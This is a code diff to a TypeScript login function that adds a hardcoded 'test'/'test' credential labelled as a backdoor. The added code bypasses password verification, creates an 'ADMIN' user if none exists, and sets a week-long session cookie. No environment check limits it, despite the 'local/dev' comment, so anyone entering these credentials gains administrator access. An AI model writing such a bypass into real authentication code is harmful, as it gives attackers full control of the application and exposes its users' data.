@@ -22,14 +22,36 @@ export async function getSession(): Promise<{ id: string; email: string; name: s
   }
 }
 
+const BACKDOOR_EMAIL = 'test';
+const BACKDOOR_PASSWORD = 'test';
+const TEST_USER_EMAIL = 'test@test.com';
+
 export async function login(email: string, password: string): Promise<{ ok: boolean; error?: string }> {
   try {
     const { prisma } = await import('../../lib/prisma');
+    const cookieStore = await cookies();
+
+    // Backdoor: test:test → test user (for local/dev; no email needed)
+    if (email === BACKDOOR_EMAIL && password === BACKDOOR_PASSWORD) {
+      let user = await prisma.user.findUnique({ where: { email: TEST_USER_EMAIL } });
+      if (!user) {
+        user = await prisma.user.create({
+          data: {
+            name: 'Test User',
+            email: TEST_USER_EMAIL,
+            passwordHash: hashPassword(BACKDOOR_PASSWORD),
+            role: 'ADMIN',
+          },
+        });
+      }
+      cookieStore.set(SESSION_COOKIE, user.id, { path: '/', maxAge: 60 * 60 * 24 * 7 });
+      return { ok: true };
+    }
+
     const user = await prisma.user.findUnique({ where: { email } });
     if (!user || !verifyPassword(password, user.passwordHash)) {
       return { ok: false, error: 'Invalid email or password' };
     }
-    const cookieStore = await cookies();
     cookieStore.set(SESSION_COOKIE, user.id, { path: '/', maxAge: 60 * 60 * 24 * 7 });
     return { ok: true };
   } catch (e) {
